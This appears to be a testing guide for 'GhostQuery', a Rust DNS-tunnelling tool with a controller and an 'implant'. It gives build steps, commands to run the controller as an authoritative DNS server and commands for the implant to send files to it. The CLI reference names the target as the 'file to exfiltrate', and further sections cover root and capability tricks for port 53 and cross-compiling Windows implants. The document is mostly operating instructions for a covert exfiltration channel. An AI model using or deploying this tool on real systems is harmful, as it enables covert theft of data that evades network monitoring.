# GhostQuery Testing Guide

## Prerequisites

- Rust toolchain installed (`rustup` from https://rustup.rs)
- Two terminals for testing
- Network access between controller and implant (if testing on separate machines)

## Build

```bash
cd GhostQueryProtocol
cargo build --release
```

Binaries created:
- `target/release/gq-controller` (1.2 MB) - Server/Receiver
- `target/release/gq-implant` (2.2 MB) - Client/Sender

## Quick Local Test (Single Machine)

### Terminal 1 - Start Controller

```bash
./target/release/gq-controller \
  --bind 127.0.0.1:5353 \
  --domain test.local \
  --output ./received \
  --verbose
```

Output:
```
GhostQuery Controller starting...
Generated random master key: a1b2c3d4e5f6789...  <-- COPY THIS KEY!
Listening on 127.0.0.1:5353
Authoritative for domain: test.local
```

### Terminal 2 - Run Implant

```bash
# Create test file
echo "Secret test data for GhostQuery" > test.txt

# Run implant with the key from Terminal 1
./target/release/gq-implant \
  --file test.txt \
  --domain test.local \
  --server 127.0.0.1:5353 \
  --key <PASTE-KEY-FROM-TERMINAL-1> \
  --verbose
```

### Verify

```bash
ls -lh ./received/
cat ./received/*.bin
# Should output: "Secret test data for GhostQuery"
```

## Two-VM Testing

### VM1: Controller (Ubuntu/Debian)

```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# Build
cd GhostQueryProtocol
cargo build --release

# Allow firewall
sudo ufw allow 53/udp

# Run (needs sudo for port 53)
sudo ./target/release/gq-controller \
  --bind 0.0.0.0:53 \
  --domain ghost.local \
  --output ~/received \
  --verbose

# Note: Copy the generated key!
```

### VM2: Implant

```bash
# Create test file
echo "Data from VM2" > secret.txt

# Run (replace IP and KEY)
./target/release/gq-implant \
  --file secret.txt \
  --domain ghost.local \
  --server 192.168.1.100:53 \
  --key <KEY-FROM-VM1> \
  --verbose
```

### Verify on VM1

```bash
ls ~/received/
cat ~/received/*.bin
```

## CLI Reference

### Controller Options

```
gq-controller [OPTIONS]

Options:
  -b, --bind <ADDR>      Bind address [default: 0.0.0.0:53]
  -d, --domain <DOMAIN>  Authoritative domain [default: ghost.local]
  -o, --output <DIR>     Output directory for received files
  -k, --key <HEX>        Master key (64 hex chars). Auto-generated if not provided
  -v, --verbose          Enable debug logging
  -h, --help             Print help
  -V, --version          Print version
```

### Implant Options

```
gq-implant [OPTIONS] --file <PATH>

Options:
  -f, --file <PATH>      File to exfiltrate (required)
  -d, --domain <DOMAIN>  Target domain [default: ghost.local]
  -s, --server <ADDR>    DNS server address (e.g., 8.8.8.8:53)
  --chunk-size <BYTES>   Chunk size [default: 32]
  --window-size <N>      Sliding window size [default: 8]
  --delay <MS>           Delay between queries [default: 100]
  -k, --key <HEX>        Master key (must match controller)
  -v, --verbose          Enable debug logging
  -h, --help             Print help
  -V, --version          Print version
```

## Troubleshooting

### Port 53 Permission Denied

```bash
# Option 1: Use higher port
./gq-controller --bind 0.0.0.0:5353 ...

# Option 2: Run as root
sudo ./gq-controller --bind 0.0.0.0:53 ...

# Option 3: Grant capability (Linux)
sudo setcap CAP_NET_BIND_SERVICE=+eip ./target/release/gq-controller
```

### Connection Refused

```bash
# Check if controller is running
netstat -ulnp | grep 5353

# Check firewall
sudo ufw status
sudo ufw allow 5353/udp
```

### Key Mismatch

Ensure both controller and implant use the exact same 64-character hex key.

```bash
# Generate a key manually
openssl rand -hex 32

# Use same key on both sides
./gq-controller -k abc123... ...
./gq-implant -k abc123... ...
```

## Performance Testing

```bash
# Create 1MB test file
dd if=/dev/urandom of=large.bin bs=1M count=1

# Fast mode (for testing)
./target/release/gq-implant \
  -f large.bin \
  -s 127.0.0.1:5353 \
  --delay 10 \
  --window-size 16 \
  -k <KEY>
```

## Windows Build

```bash
# Install cross-compilation
cargo install cross

# Build
cross build --release --target x86_64-pc-windows-gnu

# Binaries at:
# target/x86_64-pc-windows-gnu/release/gq-controller.exe
# target/x86_64-pc-windows-gnu/release/gq-implant.exe
```
